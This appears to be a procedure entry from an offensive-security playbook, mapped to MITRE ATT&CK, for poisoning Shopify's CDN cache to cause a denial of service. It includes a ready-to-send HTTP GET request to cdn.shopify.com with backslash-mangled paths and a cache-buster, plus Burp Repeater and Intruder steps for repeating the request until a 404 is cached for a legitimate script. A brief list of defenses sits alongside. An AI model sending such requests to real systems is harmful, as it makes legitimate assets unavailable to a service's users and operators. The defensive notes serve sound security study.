---
id: proc-uuid-003
tags:
  - cache-poisoning
  - repetition
  - dos
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/Modified-GET-Request-with-Backslashes-and-Cache-Buster]]'
verified: false
platforms:
  - Web
  - CDN
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Network Denial of Service]]'
updated_at: '2025-12-14T17:26:56.680Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Network Denial of Service]]'
---
# Execute-and-Repeat-Request-to-Poison-Cache

## Summary

This procedure sends the crafted poisoning request multiple times via Burp Suite to ensure the 404 response is cached by the CDN under the normalized legitimate path, effectively poisoning the cache and setting up the DoS condition.

## Description

After crafting the request, forward it initially in Burp Proxy, then use Repeater for manual sends or Intruder for automation (e.g., 5-10 iterations). The CDN caches the 404 because the key is normalized, but future legitimate requests hit the poisoned entry. Targets Shopify CDN; outcome is persistent 404 for affected files until cache expires.

## Requirements

1. Crafted poisoning request from prior procedure
2. Burp Suite Repeater or Intruder configured
3. No rate limiting on target CDN for testing

## Defense

Defensive measures and detection strategies:

- Implement cache invalidation on 4xx errors or suspicious patterns
- Rate-limit repeated requests to same path variants
- Monitor cache hit rates for anomalies indicating poisoning

## Objectives

1. Force caching of 404 response via repetition
2. Confirm poisoning by observing cache behavior
3. Simulate scalable DoS on multiple assets

## Instructions

### Step 1: Initial Send

**Context**: Forward the modified request once to trigger the origin 404.

**Command** ([[commands/Modified-GET-Request-with-Backslashes-and-Cache-Buster]]):
```http
GET /static\javascripts\vendor\bugsnag.v7.4.0.min.js?cachebuster=123 HTTP/1.1
Host: cdn.shopify.com
Connection: close
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```

> In Burp Proxy or Repeater, send once. Expected output: 404 Not Found from origin.

### Step 2: Repeat for Caching

**Context**: Automate or manually repeat to build cache entry.

> Use Burp Intruder: Set payload positions if needed, attack type 'Sniper' with no payloads (just repeat), run 5-10 times. Or manually resend in Repeater. Expected output: Consistent 404s, with caching implied by subsequent verification.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]] Impact

### Techniques

- [[Network Denial of Service]] Network Denial of Service

### Sub-Techniques


## Commands Used

- [[commands/Modified-GET-Request-with-Backslashes-and-Cache-Buster]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- cache-poisoning
- repetition
- dos
